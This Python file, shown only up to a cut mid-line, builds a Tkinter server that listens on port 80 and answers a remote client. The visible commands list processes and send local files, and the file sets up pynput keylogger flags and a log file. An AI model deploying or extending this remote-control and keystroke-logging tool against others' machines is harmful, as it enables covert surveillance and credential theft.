import os
import socket
import threading
import subprocess
import time
from tkinter import *
from tkinter import messagebox
from pynput import keyboard
from pynput.keyboard import Key

class Server:
    def __init__(self):
        self.window = Tk()
        self.window.title("Server")
        self.ip_label = Label(self.window, text="SERVER IP: ")
        self.toggle_button = Button(self.window, text="Toggle Server", command=self.toggle_server)
        self.ip_label.pack()
        self.toggle_button.pack()
        
        self.server_open = False
        self.server_socket = None
        self.client_socket = None
        self.buffer_size = 1024
        self.data_path = "data"
        self.log_path = "log.txt"
        
        self.keyboard_listener = None
        self.keylogger_active = False
        self.keylogger_hooked = False

        self.init_ui()
        
    def init_ui(self):
        self.update_ip_label()
        self.window.mainloop()

    def update_ip_label(self):
        try:
            ip = socket.gethostbyname(socket.gethostname())
            self.ip_label.config(text="SERVER IP: " + ip)
        except Exception:
            self.ip_label.config(text="SERVER IP: Not found!")

    def toggle_server(self):
        if not self.server_open:
            self.start_server()
        else:
            self.stop_server()

    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind(("0.0.0.0", 80))
            self.server_socket.listen(1)
            messagebox.showinfo("Information", "Server started successfully!")
            self.server_open = True
            self.client_socket, addr = self.server_socket.accept()
            self.handle_client()
        except Exception as e:
            messagebox.showwarning("Error", str(e))
            if self.server_socket:
                self.server_socket.close()
            self.server_open = False

    def stop_server(self):
        try:
            if self.keylogger_active:
                self.toggle_keylogger()
            if self.server_socket:
                self.server_socket.close()
            if self.client_socket:
                self.client_socket.close()
            messagebox.showinfo("Information", "Server stopped.")
            self.server_open = False
        except Exception as e:
            messagebox.showwarning("Error", str(e))
            self.server_open = False

    def send_message(self, message):
        try:
            self.client_socket.sendall(message.encode())
        except Exception:
            pass

    def recv_message(self):
        try:
            data = b""
            while True:
                chunk = self.client_socket.recv(self.buffer_size)
                if not chunk:
                    break
                data += chunk
                if b"End message" in data:
                    break
            return data.decode()
        except Exception:
            return ""

    def send_file(self, filename):
        try:
            with open(filename, "rb") as file:
                while True:
                    chunk = file.read(self.buffer_size)
                    if not chunk:
                        break
                    self.client_socket.sendall(chunk)
        except Exception:
            pass

    def handle_client(self):
        while self.server_open:
            message = self.recv_message()
            if message == "PROCESS":
                process_list = self.get_process_list()
                self.send_message(process_list)
                while True:
                    action = self
